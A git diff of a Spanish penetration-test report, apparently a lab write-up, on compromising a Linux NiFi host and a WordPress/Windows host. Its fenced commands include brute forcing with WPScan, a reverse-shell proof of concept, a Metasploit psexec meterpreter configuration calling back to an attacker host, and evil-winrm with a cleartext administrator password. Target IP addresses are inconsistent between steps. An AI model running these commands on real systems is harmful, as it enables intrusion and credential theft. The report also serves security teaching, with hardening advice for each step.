@@ -1,406 +1,459 @@
-# Informe de análisis y enumeración
+
+# Informe técnico: Máquina objetivo
+
+Este informe técnico documenta de forma completa la prueba de penetración realizada sobre la máquina objetivo.
 
 ---
 
-# 1. Escaneo inicial
+## Fase de escaneo y enumeración
 
-Se realizó un escaneo de reconocimiento contra el objetivo `10.129.245.123` con el fin de identificar los servicios expuestos y obtener una visión inicial de la superficie de ataque. Durante esta fase se detectaron dos puertos abiertos: `22/tcp`, correspondiente a SSH, y `80/tcp`, correspondiente al servicio web ejecutado bajo nginx.
+El objetivo de esta fase fue identificar los servicios activos y posibles vectores de ataque. Para ello, se realizó un escaneo de puertos contra la máquina objetivo utilizando herramientas de reconocimiento.
 
-El análisis también mostró que el servicio HTTP redirigía al dominio `helix.htb`, por lo que fue necesario asociar ese nombre al host local para continuar con la enumeración.
+<img width="1123" height="566" alt="image" src="https://github.com/user-attachments/assets/8595f388-17cf-48ad-bb95-6dca426ba915" />
 
-**Comando utilizado:**
+Se detectaron los siguientes puertos abiertos:
+
+| Puerto | Servicio | Descripción |
+|---|---|---|
+| 80 | HTTP | Servidor web (Apache/PHP) |
+| 135 | RPC | Llamadas a procedimiento remoto |
+| 139 | NetBIOS | Servicio de compartición de red Windows |
+| 445 | SMB | Compartición de archivos Windows |
+| 5985 | WinRM | Administración remota de Windows |
+
+### Análisis de los servicios detectados
+
+### Puerto 80 (HTTP)
+El puerto 80 está abierto y accesible, alojando un servidor web basado en Apache con soporte PHP. Durante la enumeración se identificó un sitio web basado en WordPress.
+
+Posibles vectores de ataque:
+
+- Enumeración de usuarios.
+- Ataques de fuerza bruta contra el panel de acceso.
+- Explotación de plugins o servicios vulnerables.
+
+### Puertos 135, 139, 445 (RPC/NetBIOS/SMB)
+Estos puertos corresponden a servicios internos de Windows usados para compartición de archivos y administración remota.
+
+Posibles vectores de ataque:
+
+- Enumeración de recursos compartidos.
+- Acceso a archivos internos.
+- Autenticación con credenciales válidas.
+- Ejecución remota de comandos si se obtienen privilegios suficientes.
+
+### Puerto 5985 (WinRM)
+El servicio WinRM permite administración remota del sistema a través de HTTP.
+
+Posibles vectores de ataque:
+
+- Acceso remoto mediante credenciales válidas.
+- Ejecución remota de comandos.
+- Control total del sistema sin necesidad de explotación adicional.
+
+### Conclusión de la fase de escaneo
+El sistema expone múltiples servicios que incrementan notablemente la superficie de ataque.
+
+En particular:
+
+- El servicio web en el puerto 80 podía revelar información útil y posibles credenciales.
+- SMB (445) y WinRM (5985) podían ser utilizados para acceso remoto si se comprometían credenciales.
+
+### Recomendaciones generales para entornos Windows
+
+- Restringir el acceso al puerto 80 únicamente a redes internas o a una zona bastionada; bloquear el acceso externo al servidor web.
+- Limitar el acceso a los puertos 135, 139 y 445 solo a equipos internos de confianza y deshabilitar SMBv1 si estuviera habilitado.
+- Revisar y endurecer la gestión de credenciales web y, si se utiliza WinRM, configurarlo sobre HTTPS (puerto 5986) en lugar de exponerlo a redes abiertas.
+
+---
+
+## 1. Servidor web accesible en el puerto 80
+
+<img width="527" height="279" alt="image" src="https://github.com/user-attachments/assets/e548de12-8bac-4a75-9b6d-443b7d55c623" />
+
+### Enumeración del servicio web (Puerto 80)
+La máquina objetivo expone un servicio web activo en el puerto 80 que es accesible desde la red.
+
+Al acceder mediante navegador, se observó un sitio funcional sin una protección visible frente a enumeración o ataques automatizados.
+
+### Análisis web con WhatWeb
+Se utilizó WhatWeb para identificar las tecnologías empleadas por el servidor.
+
+Tecnologías detectadas:
+
+- Servidor web: Apache 2.4.41
+- Sistema operativo: Windows (64 bits)
+- Lenguaje: PHP 7.3.12
+
+<img width="567" height="282" alt="image" src="https://github.com/user-attachments/assets/974e137b-72fa-4659-a889-08a1d1edacbd" />
+
+### Análisis de seguridad
+La exposición de versiones concretas del servidor web y del lenguaje de programación permite a un atacante:
+
+- Identificar vulnerabilidades conocidas.
+- Buscar exploits públicos asociados a esas versiones.
+
+La divulgación de versiones facilita la localización de exploits específicos para Apache y PHP.
+
+### Recomendaciones
+
+- Ocultar o limitar la exposición de versiones en las cabeceras HTTP (por ejemplo, ocultar Apache/X.X y PHP/XX).
+- Actualizar Apache y PHP a versiones recientes parcheadas, especialmente si el servidor está expuesto externamente.
+- Auditar el servidor con escáneres de vulnerabilidades como Nuclei y WPScan para detectar fallos compatibles con las versiones actuales.
+
+---
+
+## Fuzzing de directorios
+
+### Enumeración de rutas y descubrimiento de directorios
+Se realizó un proceso de fuzzing sobre el servidor web utilizando FFUF para identificar rutas ocultas y servicios accesibles.
+
+### Resultados obtenidos
+Se identificaron varias rutas asociadas a una instalación de WordPress:
+
+- `/wp-admin` → Panel de administración.
+- `/wp-login.php` → Página de autenticación.
+- `/wp-config.php` → Archivo de configuración.
+- `/xmlrpc.php` → Interfaz de comunicación remota.
+- `/license.txt` y `/readme.html` → Archivos de documentación.
+
+<img width="1031" height="909" alt="image" src="https://github.com/user-attachments/assets/0ecbf1b7-1ec9-4f8d-aa62-6a768c43e5a5" />
+
+### Vulnerabilidades identificadas
+
+#### Exposición de la estructura de WordPress — Severidad: Media
+La accesibilidad a rutas como `/wp-admin` y `/wp-login.php` permite identificar el sistema y facilita ataques dirigidos.
+
+#### Exposición de archivos de documentación — Severidad: Media
+Archivos como `readme.html` o `license.txt` pueden revelar:
+
+- La versión de WordPress.
+- Información del sistema.
+
+Esto ayuda a los atacantes a buscar vulnerabilidades conocidas.
+
+#### Posible exposición del archivo de configuración (`wp-config.php`) — Severidad: Crítica
+El archivo `wp-config.php` contiene información sensible como:
+
+- Credenciales de base de datos.
+- Configuración interna.
+
+Si este archivo es accesible desde el navegador, puede derivar en un compromiso total del sistema.
+
+#### XML-RPC habilitado — Severidad: Alta
+El archivo `/xmlrpc.php` permite:
+
+- Ataques automatizados de fuerza bruta.
+- Enumeración de usuarios.
+- Posibles ataques de denegación de servicio.
+
+### Conclusión
+El fuzzing permitió identificar la estructura interna del sitio, confirmar el uso de WordPress y localizar varios puntos de ataque que podrían utilizarse en fases posteriores de explotación.
+
+---
+
+## Análisis de WordPress y comportamiento de redirección
+
+### Análisis del sitio WordPress
+Al acceder al sitio WordPress en `http://192.168.0.27/wordpress/`, se observó un comportamiento anómalo durante la navegación.
+
+### Comportamiento detectado
+
+- Algunas rutas redirigían o devolvían errores que indicaban que el servidor estaba configurado como si funcionara en localhost o en un entorno de pruebas.
+- El panel de login de WordPress (`wp-login.php`) no permitía el acceso correcto incluso disponiendo de credenciales válidas.
+
+<img width="468" height="282" alt="image" src="https://github.com/user-attachments/assets/31abc063-7028-4fb0-a0f4-0bf601c8342b" />
+
+<img width="1920" height="955" alt="image" src="https://github.com/user-attachments/assets/92637635-654f-4b61-849b-fae7569925b4" />
+
+### Análisis automatizado del servicio web
+Dado el comportamiento detectado, el análisis se centró en la única página que respondía de forma consistente y mostraba cabeceras HTTP claras. Se realizó un análisis automatizado de este recurso, revelando varias debilidades de seguridad relevantes.
+
+### Vulnerabilidad: Exposición del panel de login de WordPress
+Se identificó una página de autenticación de WordPress que permanecía accesible directamente a pesar de posibles intentos de ocultación o restricción.
+
+Ruta accesible: `/wp-login.php`
+
+Esto facilita la enumeración y los ataques de fuerza bruta contra el sistema de autenticación.
+
+<img width="1920" height="955" alt="image" src="https://github.com/user-attachments/assets/9a109ead-e28f-4cc4-afb1-22ada8c41500" />
+
+Referencia asociada:
+- CVE-2024-2473 (referencia relacionada con la exposición del endpoint de login en configuraciones inseguras o mal protegidas).
+
+---
+
+## Enumeración y análisis de WordPress
+
+Durante la fase de análisis del servicio web se identificó que WordPress permitía la enumeración de usuarios a través de la API REST.
+
+### Enumeración de usuarios
+Utilizando el endpoint:
+
+`/wp-json/wp/v2/users`
+
+Se identificaron los siguientes usuarios válidos del sistema:
+
+- Administrator
+- Roldan
+
+<img width="1920" height="955" alt="image" src="https://github.com/user-attachments/assets/0cbafa23-5dbe-4523-96a1-c7a487477db5" />
+
+### Análisis automatizado con Nuclei
+Posteriormente se ejecutó Nuclei contra la URL del sitio: `http://192.168.0.27/wordpress/`
+
+El análisis detectó varios indicadores de seguridad relevantes:
+
+Vulnerabilidades detectadas:
+
+- Panel de login de WordPress expuesto — Media.
+- Enumeración de usuarios habilitada — Media/Alta.
+- Formulario de acceso disponible (posible fuerza bruta) — Alta.
+- WordPress versión 5.4.19 desactualizado — Media.
+- PHP 7.3.x desactualizado — Media.
+- Archivos informativos expuestos (`readme` / directory listing) — Baja/Informativa.
+
+<img width="1920" height="955" alt="image" src="https://github.com/user-attachments/assets/8229344d-5a53-4067-ae37-3d158d9c32ab" />
+<img width="1920" height="955" alt="image" src="https://github.com/user-attachments/assets/451e7112-bbdd-4440-9b3a-b5c5cb786107" />
+
+### Impacto de las vulnerabilidades
+
+Estas debilidades permiten a un atacante:
+
+- Identificar usuarios válidos del sistema.
+- Realizar ataques de fuerza bruta contra el panel de acceso.
+- Explotar versiones desactualizadas con vulnerabilidades conocidas.
+- Incrementar la superficie de ataque del servicio web.
+
+### Recomendaciones generales
+
+- Actualizar WordPress y PHP a versiones actuales y parcheadas.
+- Deshabilitar o restringir la API REST de WordPress y `wp-json`.
+- Ocultar `readme.html`, `license.txt` y limitar el listado de directorios.
+- Controlar y validar las redirecciones para evitar usos maliciosos.
+- Reforzar la seguridad del acceso con bloqueo de intentos, captchas y autenticación en dos factores.
+
+---
+
+## Creación de diccionario con CeWL
+
+CeWL se utilizó para generar un diccionario personalizado a partir del contenido del sitio WordPress, con el objetivo de emplearlo posteriormente en ataques de fuerza bruta contra el panel de autenticación.
+
+### Comando ejecutado
+```bash
+cewl -e http://192.168.0.27/wordpress/ -m 4 -w prototipo_xd
+```
+
+### Resultado
+Se generó un diccionario denominado `prototipo_xd` a partir de palabras extraídas del contenido de la página. Entre los términos más relevantes se encontraron:
+
+- Roldan
+- Quesos
+- Manchego
+- Quesosroldan
+
+<img width="1918" height="920" alt="image" src="https://github.com/user-attachments/assets/4f616aef-bd23-44fe-9117-bcee5134b763" />
+
+### Análisis
+El diccionario generado contenía términos contextuales del propio objetivo, aumentando la eficacia frente a diccionarios genéricos. Este enfoque adapta el ataque al entorno real del sistema objetivo.
+
+### Clasificación de la vulnerabilidad
+
+- Tipo: Exposición de información útil para ataques de diccionario.
+- Severidad: Media.
+- Impacto: Facilita ataques de fuerza bruta dirigidos al panel de autenticación.
+
+### Recomendaciones
+
+- Restringir el acceso al panel de administración de WordPress por IP o red interna.
+- Ocultar o modificar la URL `wp-login.php` para dificultar ataques automatizados.
+- Reforzar la seguridad del inicio de sesión con bloqueo por intentos fallidos y autenticación en dos factores.
+
+---
+
+## Explotación de WordPress
+
+### Ataque de fuerza bruta contra WordPress
+Se utilizó WPScan para realizar un ataque de fuerza bruta contra el panel de autenticación de WordPress empleando el diccionario personalizado generado anteriormente.
+
+### Comando ejecutado
+```bash
+wpscan --url http://192.168.0.27/wordpress/ --usernames administrador,roldan --passwords prototipo_xd
+```
+
+### Objetivo
+Obtener credenciales válidas para acceder al panel de administración mediante ataque de diccionario.
+
+### Resultado
+El ataque fue exitoso, obteniendo las siguientes credenciales:
+
+- Usuario: `roldan`
+- Contraseña: `QuesoManchego`
+
+<img width="1918" height="920" alt="image" src="https://github.com/user-attachments/assets/0274338c-177b-43fe-843a-2734eecce46d" />
+
+<img width="1918" height="920" alt="image" src="https://github.com/user-attachments/assets/bb74396c-d59c-42f2-9c0e-48f068d2aa2f" />
+
+- Al intentar iniciar sesión, el sitio redirigía a localhost, por lo que no se pudo acceder al panel administrativo desde la máquina atacante.
+- Tipo de vulnerabilidad: acceso administrativo válido bloqueado por una configuración incorrecta de URL.
+- Severidad: Alta.
+
+### Recomendaciones
+
+- Revisar los valores WordPress Address y Site URL para que no apunten a localhost.
+- Eliminar o corregir el sitio de pruebas en localhost si no está en producción.
+- Restringir el acceso al panel de administración a IPs internas en entornos de producción.
+
+---
+
+## Pivot hacia SMB
+
+### Acceso al servicio SMB
+Usando las credenciales obtenidas previamente del ataque de fuerza bruta a WordPress, se probó el acceso al servicio SMB expuesto en la máquina Windows.
+
+### Validación y acceso
+Se utilizó NetExec para verificar la validez de las credenciales contra SMB:
 
 ```bash
-nmap -sS --open -sC -sV -n -Pn 10.129.245.123
+netexec smb 192.168.5.140 -u roldan -p "QuesoManchego"
 ```
 
-<img width="1769" height="633" alt="image" src="https://github.com/user-attachments/assets/3aa5ecf8-f3e4-4037-b7dc-65ee5698bb99" />
+<img width="1062" height="562" alt="image" src="https://github.com/user-attachments/assets/f665994c-7593-4883-8525-980d967114b1" />
 
-**Recomendaciones:**
+### Enumeración de usuarios y recursos
+Tras la validación, se realizaron tareas de enumeración:
 
-- Restringir el acceso SSH por IP o mediante VPN.
-- Mantener los servicios expuestos actualizados.
-- Revisar si el host debe responder con redirecciones públicas.
+**Usuarios del sistema:**
+
+- Administrador
+- Guest
+- Roldan
+
+**Recursos compartidos detectados:**
+
+- ADMIN$
+- C$
+- IPC$
+
+### Clasificación de la vulnerabilidad
+
+- Tipo: Acceso no autorizado mediante credenciales válidas.
+- Severidad: Alta.
+- Impacto: Acceso a recursos internos del sistema Windows y enumeración de información sensible.
+
+### Recomendaciones
+
+- Restringir el acceso SMB únicamente a redes internas, con control de credenciales.
+- Evitar cuentas locales débiles (`roldan`, `administrator`) con contraseñas relacionadas con el contenido web.
+- Separar claramente el entorno web de pruebas de la red de producción para evitar que credenciales de laboratorio puedan reutilizarse en el sistema real.
 
 ---
 
-# 2. Enumeración web inicial
+## Ejecución remota vía SMB (Metasploit)
 
-Tras configurar la resolución del dominio, se accedió a la página principal del servicio web para analizar su contenido e identificar posibles puntos de interacción. La aplicación respondió correctamente con código `200 OK` y mostró una página corporativa relacionada con Helix Industries, centrada en automatización industrial e infraestructura crítica.
+Tras obtener credenciales válidas en el sistema, se identificó la posibilidad de acceder al servicio SMB de Windows. A partir de la enumeración previa, se observó que el usuario tenía permisos suficientes para interactuar con recursos administrativos, lo que motivó el uso de un módulo de ejecución remota.
 
-Durante esta fase también se identificaron cabeceras y metadatos básicos del servidor, incluyendo el uso de nginx sobre Ubuntu y la presencia de una dirección de correo visible en el contenido.
+### Módulo utilizado
+`exploit/windows/smb/ms17_010_psexec`
 
-**Comando utilizado:**
+Este módulo permite ejecutar comandos remotos a través de SMB usando credenciales válidas.
+
+### Configuración del exploit
+
+- Usuario: `roldan`
+- Contraseña: `QuesoManchego`
+- Host objetivo: `192.168.0.26`
+- Puerto: `445`
+- Payload: `meterpreter/reverse_tcp`
+- LHOST: `192.168.0.19`
+- LPORT: `4444`
+
+<img width="1183" height="549" alt="image" src="https://github.com/user-attachments/assets/0dca61f4-a636-4203-9a4a-8d9846ed13d3" />
+
+### Justificación de la explotación
+Después de validar el acceso SMB con credenciales válidas y observar la existencia de recursos administrativos, se concluyó que el usuario tenía privilegios suficientes para ejecutar código remotamente.
+
+Por este motivo se utilizó el módulo PsExec, que crea un servicio en el sistema objetivo y ejecuta una carga maliciosa.
+
+El exploit estableció una conexión remota con el sistema víctima mediante una sesión Meterpreter, confirmando la ejecución remota de código en el host Windows.
+
+### Clasificación de la vulnerabilidad
+
+- Tipo: Ejecución remota de código vía SMB.
+- Severidad: Crítica.
+- Impacto: Compromiso total del sistema (acceso remoto a la máquina Windows).
+
+---
+
+## Acceso a archivos internos y extracción de credenciales
+
+Una vez obtenido acceso remoto mediante la sesión Meterpreter, se buscaron archivos sensibles dentro del sistema. Dado que ya se había identificado WordPress, se apuntó al archivo de configuración (`wp-config.php`), ya que normalmente contiene credenciales de base de datos.
+
+### Búsqueda del archivo de configuración
+Se utilizó el siguiente comando:
 
 ```bash
-whatweb http://helix.htb/
+dir /s /b C:\wp-config.php
 ```
 
-<img width="2082" height="842" alt="image" src="https://github.com/user-attachments/assets/6a62adeb-6e25-4995-b8e9-f52f9872ed01" />
+Se identificó la siguiente ruta:
 
-**Recomendaciones:**
+`C:\wamp64\www\wordpress\wp-config.php`
 
-- Reducir la información expuesta en el frontend.
-- Evitar mostrar correos o datos de contacto en texto claro si no es necesario.
-- Revisar qué metadatos y cabeceras se están publicando de forma accesible.
-
----
-
-# 3. Pruebas manuales
-
-Se realizó una prueba manual de la aplicación web con el objetivo de comprender su comportamiento e identificar posibles puntos de interacción. Sin embargo, no se encontró ningún elemento relevante con el que se pudiera interactuar directamente, por lo que esta fase se limitó a una revisión visual y funcional básica del contenido expuesto.
-
-<img width="2268" height="1438" alt="image" src="https://github.com/user-attachments/assets/37f403c3-c85c-467c-893d-8913e5e52e2f" />
-
-**Recomendaciones:**
-
-- Minimizar la exposición pública innecesaria.
-- Revisar qué contenido es accesible sin autenticación.
-- Evitar mostrar información estática que no aporte valor al usuario final.
-
----
-
-# 4. Descubrimiento de subdominios
-
-Debido a que el servicio web parecía estar desplegado sobre una infraestructura basada en virtual hosts, se realizó una enumeración de subdominios mediante fuzzing del encabezado `Host`. El objetivo de esta fase era identificar servicios adicionales expuestos bajo el dominio principal `helix.htb`.
-
-Durante la primera pasada con una lista reducida se detectó el subdominio `flow`. Posteriormente se amplió la búsqueda con una wordlist más grande para confirmar si existían otros virtual hosts, aunque no se obtuvieron más resultados relevantes.
-
-**Comandos utilizados:**
+### Descarga del archivo
+Después de localizarlo, el archivo se descargó a la máquina atacante a través de Meterpreter:
 
 ```bash
-ffuf -u http://helix.htb/ -H "Host: FUZZ.helix.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 154
-ffuf -u http://helix.htb/ -H "Host: FUZZ.helix.htb" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -fs 154
+download C:\\wamp64\\www\\wordpress\\wp-config.php
 ```
 
-<img width="1371" height="733" alt="image" src="https://github.com/user-attachments/assets/d7399804-35c7-45d3-b464-f2a21fa0494a" />
+El archivo fue transferido correctamente al sistema del auditor.
 
-<img width="1595" height="968" alt="image" src="https://github.com/user-attachments/assets/2da546b3-46ec-4b43-853b-1949f2b85e66" />
+<img width="999" height="602" alt="image" src="https://github.com/user-attachments/assets/8cfadd39-cb5f-44dc-bea1-216429307294" />
 
-**Recomendaciones:**
+<img width="1185" height="590" alt="image" src="https://github.com/user-attachments/assets/ca8af1e5-953d-48b9-b22e-edc0f687b295" />
 
-- Reducir la exposición de subdominios innecesarios.
-- Proteger los servicios internos con autenticación robusta.
-- Evitar respuestas diferenciadas que faciliten el reconocimiento.
+El acceso web previo no permitía visualizar este archivo debido a restricciones del servidor y a la configuración orientada a localhost. Sin embargo, una vez obtenido acceso directo al sistema, fue posible acceder al archivo de configuración que contenía información sensible como:
 
----
+- Credenciales de base de datos.
+- Configuración interna de WordPress.
 
-# 5. Revisión del subdominio
+El archivo de configuración de WordPress contiene credenciales en texto claro para la conexión a la base de datos.
 
-Una vez identificado el subdominio, se realizó una revisión manual de su comportamiento para analizar su función, comprobar las opciones disponibles y determinar la versión de la tecnología utilizada. Esta fase ayudó a ampliar la enumeración y a definir mejor los posibles caminos de ataque.
+La obtención de estas credenciales implica:
 
-<img width="1731" height="830" alt="image" src="https://github.com/user-attachments/assets/2ececbc0-09a8-41a5-83c2-b207edadb54b" />
+- Acceso directo a la base de datos del sistema.
+- Posibilidad de leer, modificar o eliminar información.
+- Acceso a datos sensibles como usuarios, contraseñas y contenido del sitio.
 
-**Recomendaciones:**
-
-- Restringir el acceso a servicios internos.
-- Ocultar información de versiones expuesta públicamente.
-- Revisar si el subdominio debería estar disponible sin control adicional.
+Esta cadena de ataque demuestra cómo una vulnerabilidad inicial en el servicio web puede derivar en el compromiso total del sistema y en la exposición de credenciales críticas.
 
 ---
 
-# 6. Rastreo y enumeración de rutas
+## Acceso remoto mediante WinRM
 
-A continuación se ejecutó un rastreo sobre el subdominio para localizar APIs, rutas internas y otros recursos que pudieran haberse pasado por alto durante la revisión manual. Los resultados mostraron principalmente archivos estáticos y referencias internas del entorno NiFi, sin aportar acceso útil adicional en ese momento.
-
-**Comando utilizado:**
+Tras obtener credenciales desde `wp-config.php`, estas se reutilizaron contra otros servicios del sistema. Dado que WinRM (puerto 5985) estaba activo, se intentó el acceso remoto con dichas credenciales.
 
 ```bash
-katana -u http://flow.helix.htb/nifi/ -jc -kf all -d 10
+evil-winrm -i 192.168.0.26 -u Administrator -p T00MuchW0rk70D0
 ```
 
-<img width="1828" height="877" alt="image" src="https://github.com/user-attachments/assets/d5af2325-40ce-403b-b61a-d79bc38eeb26" />
+<img width="1208" height="571" alt="image" src="https://github.com/user-attachments/assets/4f10fe47-3bba-47ae-89d5-f75e7f964bf5" />
 
-**Recomendaciones:**
+### Clasificación de la vulnerabilidad
 
-- Limitar la exposición de rutas internas.
-- Evitar publicar recursos estáticos innecesarios.
-- Revisar la estructura del servicio para impedir una enumeración sencilla.
+- Tipo: Reutilización de credenciales / acceso remoto no autorizado.
+- Severidad: Crítica.
+- Impacto: Control total del sistema (acceso de administrador).
+
+La reutilización de credenciales permitió el acceso directo al sistema mediante WinRM con privilegios administrativos, confirmando el compromiso total de la máquina.
 
 ---
 
-# 7. Identificación de versiones
+## Conclusión
 
-Una vez identificada la versión expuesta, Apache NiFi 1.21.0, se revisaron tanto la página principal del puerto 80 como el subdominio para comprender mejor el servicio y su superficie de ataque. A partir de esta información, se investigaron exploits públicos relacionados con la tecnología detectada.
+Esta auditoría demostró que, partiendo del acceso inicial al servicio web, es posible comprometer por completo la infraestructura.
 
-Durante la revisión apareció un módulo de Metasploit asociado a `CVE-2023-34468`, dirigido a Apache NiFi H2 RCE. El módulo se probó varias veces con distintos parámetros y cargas útiles, pero no proporcionó una sesión funcional, por lo que se descartó como vía directa de explotación en ese momento.
+La combinación de credenciales débiles, reutilización de contraseñas y exposición de servicios internos permitió escalar el ataque hasta obtener máximos privilegios en ambos sistemas.
 
-**Comandos utilizados:**
-
-```bash
-msfconsole
-use exploit/linux/http/apache_nifi_h2_rce
-options
-set RHOSTS 10.129.227.225
-run
-```
-
-<img width="1108" height="616" alt="image" src="https://github.com/user-attachments/assets/9584396e-cbe4-401f-bf5a-2da01a2684d2" />
-
-<img width="1834" height="880" alt="image" src="https://github.com/user-attachments/assets/5913585b-11d0-4a0f-963e-3a629b0a2528" />
-
-**Recomendaciones:**
-
-- Mantener Apache NiFi actualizado.
-- Restringir el acceso a las interfaces de administración.
-- Revisar la exposición de componentes que permitan ejecución dinámica.
-
----
-
-# 8. Búsqueda de explotación
-
-Una vez identificada la versión del servicio, la enumeración se amplió mediante fuzzing para encontrar endpoints adicionales o contenido oculto. Sin embargo, los resultados no revelaron más rutas útiles ni servicios alternativos, confirmando que la superficie de ataque estaba limitada al subdominio analizado. En esta situación, se probó un exploit público de GitHub, que finalmente permitió obtener acceso interactivo al sistema.
-
-<img width="1501" height="720" alt="image" src="https://github.com/user-attachments/assets/ce1340dc-ab9d-4454-b254-a0cbf11b0bf2" />
-
-**Comando utilizado:**
-
-```bash
-python3 CVE-2023-34468_poc.py --target http://flow.helix.htb --lhost 10.10.14.54 --lport 4444 --cleanup
-```
-
-<img width="1684" height="808" alt="image" src="https://github.com/user-attachments/assets/e60a5bad-2c9f-4d32-b694-135908a7f1ef" />
-
-<img width="1604" height="794" alt="image" src="https://github.com/user-attachments/assets/ba7d16ff-eecf-484d-98cf-94afb0858c7f" />
-
-**Recomendaciones:**
-
-- Aplicar parches de seguridad de forma continua.
-- No exponer servicios críticos sin autenticación.
-- Limitar las posibilidades de ejecución remota en componentes de administración.
-
----
-
-# 9. Acceso inicial al sistema
-
-Una vez obtenida una shell inicial como el usuario `nifi`, se realizó una enumeración del sistema para identificar cuentas locales y comprender mejor el entorno comprometido. La revisión de `/etc/passwd` reveló cuentas de servicio como `nifi`, `plc` y `operator`, además de otras cuentas estándar del sistema.
-
-A continuación, se confirmó la identidad del usuario actual y se exploró el directorio de instalación de NiFi, verificando la estructura típica del servicio y la presencia de varios directorios relacionados con repositorios internos, configuración, extensiones y registros.
-
-**Comandos utilizados:**
-
-```bash
-cat /etc/passwd
-id
-script /dev/null
-```
-
-<img width="1758" height="1029" alt="image" src="https://github.com/user-attachments/assets/36dc014e-5a95-4fe1-9a76-3f24837a3e83" />
-
-**Recomendaciones:**
-
-- Revisar la presencia de cuentas de servicio innecesarias.
-- Restringir permisos en los directorios de instalación.
-- Proteger la información sensible expuesta en la configuración del servicio.
-
----
-
-# 10. Hallazgo en `support-bundles`
-
-Durante la enumeración local del directorio de instalación de NiFi se revisaron varios componentes del sistema. En esta exploración se localizó el directorio `support-bundles`, dentro del cual apareció un archivo llamado `operator_id_ed25519.bak`, algo relevante porque parecía ser una copia de una clave privada o una copia de seguridad asociada al usuario `operator`.
-
-Este hallazgo sugirió la posible existencia de credenciales reutilizables o material sensible expuesto en disco, y se convirtió en uno de los puntos clave para las fases posteriores de enumeración.
-
-**Comandos utilizados:**
-
-```bash
-ls
-cd support-bundles
-ls
-```
-
-<img width="1520" height="681" alt="image" src="https://github.com/user-attachments/assets/a21cea39-79cf-4569-80ce-3b44d7e689c4" />
-
-**Recomendaciones:**
-
-- No almacenar copias de claves privadas en directorios accesibles.
-- Proteger las copias de credenciales con permisos estrictos.
-- Revisar y eliminar artefactos sensibles innecesarios.
-
----
-
-# 11. Clave privada recuperada
-
-Durante la revisión del directorio `support-bundles` se encontró un archivo llamado `operator_id_ed25519.bak`, cuyo contenido correspondía a una clave privada de OpenSSH. Esto fue especialmente relevante porque ofrecía una posible vía adicional de acceso mediante autenticación SSH con el usuario `operator`.
-
-**Comando utilizado:**
-
-```bash
-cat operator
-```
-
-**Contenido:**
-
-```text
------BEGIN OPENSSH PRIVATE KEY-----
-...
------END OPENSSH PRIVATE KEY-----
-```
-
-<img width="1520" height="681" alt="image" src="https://github.com/user-attachments/assets/fcfc8b5c-e012-4dd9-9450-afd91c5b06e5" />
-
-**Recomendaciones:**
-
-- No dejar copias de claves privadas en disco.
-- Proteger cualquier copia de seguridad sensible con permisos estrictos.
-- Revisar los artefactos de soporte para evitar que expongan credenciales reutilizables.
-
----
-
-# 12. Acceso SSH
-
-Una vez recuperada la clave privada, el archivo se descargó de forma local y se utilizó para establecer una conexión SSH con el usuario `operator` en el objetivo. El acceso fue exitoso y permitió una sesión interactiva sobre el sistema Ubuntu, confirmando que la clave correspondía a una cuenta válida en el host.
-
-Tras iniciar sesión, el sistema mostró información general del host, incluyendo la versión de Ubuntu, el uso de disco y la dirección IP interna del equipo. A partir de ese momento, la enumeración continuó desde una posición más privilegiada que la shell anterior.
-
-**Comando utilizado:**
-
-```bash
-ssh -i operator.key operator@10.129.245.123
-```
-
-<img width="2057" height="986" alt="image" src="https://github.com/user-attachments/assets/4a335df3-de7d-419f-908f-ce625d829462" />
-
-**Recomendaciones:**
-
-- Evitar reutilizar claves privadas en archivos de copia de seguridad.
-- Revocar credenciales expuestas en directorios accesibles.
-- Revisar el acceso SSH para cuentas de servicio y limitarlo cuando no sea necesario.
-
----
-
-# 13. Enumeración local adicional
-
-Tras acceder al sistema mediante SSH como `operator`, continuó la enumeración local del entorno y se revisaron archivos de configuración y documentación disponibles. Durante esta fase se inspeccionó el directorio de configuración de NiFi, y se intentó consultar información relacionada con servicios del host, aunque no se encontró el archivo esperado en `/etc/helix/config.ini`.
-
-Más adelante, se descargaron localmente dos archivos de interés desde el directorio personal del usuario: `Operator Control & Safety Guide.pdf` y `control systems diagram.png`. Ambos documentos resultaron útiles para comprender mejor la arquitectura del entorno y el comportamiento general del sistema controlado por Helix.
-
-**Comandos utilizados:**
-
-```bash
-cd /opt/nifi-1.21.0/conf
-ls
-cat /etc/helix/config.ini
-sudo systemctl status helix-opc
-scp -i operator.key operator@10.129.245.123:"/home/operator/Operator\ Control\ \&\ Safety\ Guide.pdf" ./Guia_Helix.pdf
-scp -i operator.key operator@10.129.245.123:"/home/operator/control\ systems\ diagram.png" ./Diagrama_Helix.png
-```
-
-<img width="1456" height="533" alt="image" src="https://github.com/user-attachments/assets/1296f4b4-315b-4f9d-b16b-51a01ab4ae7d" />
-
-**Recomendaciones:**
-
-- Documentar y proteger los archivos operativos sensibles.
-- Evitar dejar manuales o diagramas accesibles sin control.
-- Revisar los permisos sobre la información técnica del entorno.
-
----
-
-# 14. PDF protegido
-
-Al abrir el PDF, se confirmó que estaba protegido con contraseña, lo que hizo sospechar que podía contener información sensible o documentación interna importante. Por ello, se extrajo su hash para intentar recuperar la contraseña y comprender qué información estaba siendo protegida.
-
-Un ataque de diccionario con `rockyou.txt` permitió recuperar la contraseña del documento, que resultó ser `operator1`. Esto confirmó que el archivo no contenía credenciales directas, sino documentación interna protegida que merecía un análisis más profundo.
-
-**Comandos utilizados:**
-
-```bash
-cat hash_pdf.txt
-john --wordlist=/usr/share/wordlists/rockyou.txt --encoding=ISO-8859-1 hash_pdf.txt
-```
-
-<img width="1442" height="430" alt="image" src="https://github.com/user-attachments/assets/d493b011-8e62-46e4-8a3c-71908620c324" />
-
-**Recomendaciones:**
-
-- Proteger los documentos sensibles con contraseñas robustas.
-- Evitar contraseñas débiles o predecibles.
-- Revisar el contenido de guías y manuales internos para que no expongan información crítica.
-
----
-
-# 15. Análisis de la documentación
-
-Durante la enumeración del sistema se encontraron varios archivos en el directorio de configuración que inicialmente no parecían especialmente relevantes. Antes de profundizar en ellos, se intentó localizar una contraseña, una credencial mal almacenada o cualquier dato sensible que facilitara el acceso a otras partes del entorno, aunque no se obtuvo ningún resultado útil en esa dirección.
-
-Con el tiempo, esos archivos se revisaron con más detalle debido a que la presencia de una guía en PDF y un diagrama PNG dentro de un directorio orientado a configuración resultaba llamativa. Esto sugirió que podían aportar contexto sobre la arquitectura del sistema o su funcionamiento interno, más que credenciales reutilizables de forma directa.
-
